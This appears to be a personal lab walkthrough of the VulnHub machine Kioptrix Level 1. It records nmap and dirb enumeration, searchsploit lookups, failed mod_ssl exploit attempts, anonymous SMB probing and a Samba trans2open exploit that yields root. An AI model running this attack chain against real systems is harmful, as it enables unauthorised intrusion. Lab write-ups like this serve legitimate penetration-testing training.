## Machine Info

- **Name**: Kioptrix: Level 1 (#1)
- **Date release**: 17 Feb 2010
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: http://www.kioptrix.com/blog/?page_id=135
- **Vulnhub**: [Kioptrix: Level 1 (#1) ~ VulnHub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

## PWK

- nmap

```
$ sudo nmap -sT -sV -sC -O -p22,80,111,139,443,1024 $IP -oA nmap/detail
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 00:17 CST
Nmap scan report for 192.168.123.28
Host is up (0.00069s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: tMYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2023-11-14T17:20:07+00:00; +1h01m50s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:56:FD:5F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1h01m49s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.60 seconds
```

- 80 - http - no work

    - path

  ```
  $ dirb http://$IP
  
  -----------------
  DIRB v2.22
  By The Dark Raver
  -----------------
  
  START_TIME: Wed Nov 15 01:30:18 2023
  URL_BASE: http://192.168.123.28/
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
  
  -----------------
  
  GENERATED WORDS: 4612
  
  ---- Scanning URL: http://192.168.123.28/ ----
  + http://192.168.123.28/~operator (CODE:403|SIZE:273)
  + http://192.168.123.28/~root (CODE:403|SIZE:269)
  + http://192.168.123.28/cgi-bin/ (CODE:403|SIZE:272)
  + http://192.168.123.28/index.html (CODE:200|SIZE:2890)
  ==> DIRECTORY: http://192.168.123.28/manual/
  ==> DIRECTORY: http://192.168.123.28/mrtg/
  ==> DIRECTORY: http://192.168.123.28/usage/
  
  ---- Entering directory: http://192.168.123.28/manual/ ----
  (!) WARNING: Directory IS LISTABLE. No need to scan it.
      (Use mode '-w' if you want to scan it anyway)
  
  ---- Entering directory: http://192.168.123.28/mrtg/ ----
  + http://192.168.123.28/mrtg/index.html (CODE:200|SIZE:17318)
  
  ---- Entering directory: http://192.168.123.28/usage/ ----
  + http://192.168.123.28/usage/index.html (CODE:200|SIZE:3704)
  
  -----------------
  END_TIME: Wed Nov 15 01:30:44 2023
  DOWNLOADED: 13836 - FOUND: 6
  ```

  - mrtg [x]
  - manual [x]
  - searchsploit apache [x]

  ```
  $ searchsploit apache 1.3.20
  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                 | unix/remote/21671.c [x]
  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                           | unix/remote/764.c   [x]
  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                           | unix/remote/47080.c [*]
  
  $ searchsploit apache 1.3 remote
  Apache 1.3.x mod_mylo - Remote Code Execution                                                                                        | multiple/remote/67.c
  Red-Hat version: unknow
  =>
  $ ./67 -t $IP -T 1
  [-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...
  [-] Trying 0x08105104 ...
  
  
  
  [*] Connection to 196.168.123.28 was rejected
  
  Have a nice day!
  
  => 47080
  $ ./OpenFuck
  
  *******************************************************************
  * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
  *******************************************************************
  * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
  * #hackarena  irc.brasnet.org                                     *
  * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
  * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
  * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
  *******************************************************************
  
  : Usage: ./OpenFuck target box [port] [-c N]
  
    target - supported box eg: 0x00
    box - hostname or IP address
    port - port for ssl connection
    -c open N connections. (use range 40-50 if u dont know)
  
  
    Supported OffSet:
          0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
          0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
  
  Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
  
  $ ./OpenFuck 0x6a $IP 443 -c 45
  
  *******************************************************************
  * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
  *******************************************************************
  * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
  * #hackarena  irc.brasnet.org                                     *
  * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
  * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
  * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
  *******************************************************************
  
  Connection... 1 of 45Connection to 196.168.123.28:443 failed: Connection timed out
  ```

- 139 - smb
    - file lekage -> smbclient connect [x]

```
$ smbclient //$IP/IPC$
Password for [WORKGROUP\qwe]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> ^C

$ smbclient //$IP/ADMIN$
Password for [WORKGROUP\qwe]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
```

- smb version - exploit - 2 ways ok
    - trans2open Overflow
    - Remote Code Execution [this wp]

```
msf6 > search scanner smb version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set RHOST
set RHOSTNAME  set RHOSTS
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.123.28
RHOSTS => 192.168.123.28
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.123.28:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.123.28:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.123.28:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
=> searchsploit samba 2.2.1
$ searchsploit samba 2.2.1

Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                         | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                    | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                        | linux_x86/dos/36741.py

Shellcodes: No Results


DONE:
Usage: ./sambal [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode

$ ./sambal -d 0 -C 60 -S 192.168.123
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Scan mode.
+ [192.168.123.28] Samba
^C

$ ./sambal -d 0 -v -b 0 192.168.123.28
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```

